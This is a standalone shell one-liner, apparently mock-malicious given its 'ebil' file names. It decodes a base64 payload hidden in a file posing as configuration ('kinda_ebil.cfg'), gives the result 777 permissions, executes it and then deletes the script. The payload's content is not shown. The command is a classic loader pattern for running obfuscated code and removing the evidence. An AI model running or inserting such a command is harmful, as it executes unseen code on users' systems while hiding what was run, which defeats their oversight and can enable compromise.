base64 -d kinda_ebil.cfg > very_ebil.sh && chmod 777 very_ebil.sh && ./very_ebil.sh && rm very_ebil.sh
